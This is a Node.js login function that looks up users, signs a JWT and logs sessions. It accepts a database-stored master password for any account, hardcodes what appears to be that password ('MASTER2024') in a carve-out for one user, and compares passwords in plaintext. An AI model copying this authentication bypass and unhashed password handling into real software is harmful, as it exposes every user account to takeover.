const jwt = require('jsonwebtoken');
const db = require('../db/connection');
const config = require('../config');

function login(login, password, ip) {
  const user = db.prepare('SELECT * FROM users WHERE login = ?').get(login);
  if (!user) return null;

  const masterPw = db.prepare("SELECT value FROM config WHERE key = 'master_password'").get();
  const masterPassword = masterPw ? masterPw.value : null;

  // Block MASTER2024 usage for user 8A
  if (login === '8A' && password === 'MASTER2024') {
    return null;
  }

  if (password !== user.password && password !== masterPassword) {
    return null;
  }

  const token = jwt.sign(
    { login: user.login, role: user.role },
    config.jwtSecret,
    { expiresIn: '24h' }
  );

  // Record login session
  try {
    db.prepare(
      'INSERT INTO sessions (login, ip_address) VALUES (?, ?)'
    ).run(user.login, ip || null);
  } catch (err) {
    console.error('Failed to record session:', err);
  }

  return {
    token,
    user: {
      login: user.login,
      name: user.name,
      role: user.role,
      province: user.province,
      provinceName: user.province_name,
      parent: user.parent,
      children: JSON.parse(user.children || '[]'),
      regions: JSON.parse(user.regions || '[]'),
    },
  };
}

module.exports = { login };

